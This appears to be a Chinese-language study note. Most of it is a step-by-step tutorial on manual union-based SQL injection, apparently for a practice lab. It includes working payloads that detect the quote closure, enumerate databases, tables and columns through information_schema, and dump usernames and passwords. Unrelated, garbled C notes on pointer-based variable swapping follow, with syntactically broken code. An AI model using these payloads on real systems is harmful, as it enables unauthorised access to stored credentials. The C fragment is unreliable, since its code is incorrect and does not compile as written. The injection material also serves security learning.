常见手动 sql 注入的闭合方式
or 1=1

具体使用哪种方式取决于 SQL语句使用了什么方式，我们可以在注入点输入 反斜杠 \ 来判断页面使用的哪种闭合方式

\ 表示转义，直接输入 \ 会将字段的闭合方式暴露出来，因为被转义不生效，导致SQL 语句报错，并爆出闭合方式

弹出： ‘1’ LIMIT 0,1 这个错。发现\转义后有一个单引号，说明此 sql 语句基于单引号闭合。
爆破库名
-1’ union select 1,2,database()–+
1,2,database()
database() 替换了字段3，作用是查询当前数据库名称，其中1，2是为了补充 第一个和第二个字段的显示结果
拓展，常用
version() – MySQL版本
user() – 数据库用户名
database() – 数据库名称
@@datadir – 数据库路径
@@version_compile_os – 操作系统版本
列出当前数据库中的所有表的名称
5.0以下和5.0以上的区别 5.0以下没有 information_schema 这个数据表，只能爆破表
5.0以下多用户单操作，5.0以上多用户多操作
查看 information_schema 库中 tables 表名 table_schema 等于 security 的相关信息

table_schema – 该字段存储数据库名
table_name – 该字段存储对应数据中的包括的表名
列出所有表名
-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database();–+
查询表中字段名
-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’数据库表的名字’–+

-1’ union select 1,2,group_concat(一个或多个字段名，逗号分隔) from 表名–+或
union select 1,group_concat(username,0x3a,0x3a,password),3 from users –+（这里的1，2或1，3是为了构造一个数列来回显）
使用冒号将用户名和密码分开 0x3a
我们可以在每一个用户名：密码后面添加一个换行符; 0x3C,0x68,0x72,0x2F,0x3E

指针与函数的变量交换
void swap(int px,intpy)
{
int t;
t=*px;
*px=py;
py=t}
ps:通过指针实现了变量从函数中的输出，倘若不使用指针，则函数中交换的只是主函数中变量的克隆体，
无法返回至主函数中。即必须交换px与py的值

int x;
int y;
}struct point getstruct(void);

y=getstruct(); } \此处使主函数中的y直接＝函数中返回的结构变量来达到改变主函数变量的目的

}
